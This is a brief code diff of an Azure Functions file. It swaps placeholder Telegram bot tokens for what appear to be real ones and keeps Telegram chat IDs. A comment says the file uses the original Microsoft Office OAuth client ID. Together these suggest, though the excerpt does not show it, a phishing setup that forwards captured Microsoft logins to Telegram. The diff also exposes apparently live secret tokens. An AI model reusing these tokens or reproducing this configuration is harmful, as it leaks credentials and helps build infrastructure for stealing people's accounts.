@@ -1,10 +1,10 @@
 const { app } = require("@azure/functions");
 const axios = require('axios');
 
-// Telegram configuration - REAL TOKENS
-const TELEGRAM_BOT_TOKEN = "7768080373:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
+// Telegram configuration - CORRECT TOKENS
+const TELEGRAM_BOT_TOKEN = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
 const TELEGRAM_CHAT_ID = "6743632244";
-const TELEGRAM_BOT_TOKEN2 = "7942871168:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
+const TELEGRAM_BOT_TOKEN2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
 const TELEGRAM_CHAT_ID2 = "6263177378";
 
 // OAuth configuration - Using ORIGINAL Microsoft Office client ID
